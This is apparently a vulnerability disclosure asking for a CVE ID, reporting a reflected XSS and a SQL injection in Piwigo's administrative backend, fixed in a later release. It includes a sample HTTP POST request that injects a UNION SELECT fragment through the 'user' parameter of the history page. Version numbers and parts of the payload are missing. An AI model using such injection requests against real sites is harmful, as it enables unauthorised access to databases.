I found a reflecting XSS- and a SQL injection-vulnerability in the administrative backend of Piwigo <= v.  The reflecting XSS vulnerability resides in the "page" parameter used in the file admin.php which can be found in the administrative backend located here in a common Piwigo installation:  http://{TARGET}/admin.php?page=plugin-AdminTools  Exploit-Example:  http://  The SQL injection vulnerability can as well be found in the administrative backend and can be found in the "History" functionality located here:  http://{TARGET}/admin.php?page=history  The SQL injection vulnerability can be exploited by appending arbitrary SQL statements in a POST request to the parameter "user":  Exploit-Example:  POST /piwigo/admin.php?page=history HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux Accept: Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://localhost/piwigo/admin.php?page=history&search_id=82 Cookie: pwg_display_thumbnail=no_display_thumbnail; Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length:  AND 1=2 UNION SELECT -- &image_id=&filename=&ip=&display_thumbnail=no_display_thumbnail&submit=Submit  The issue has been fixed in version released on 17th February  Can I have a CVE-ID for it?
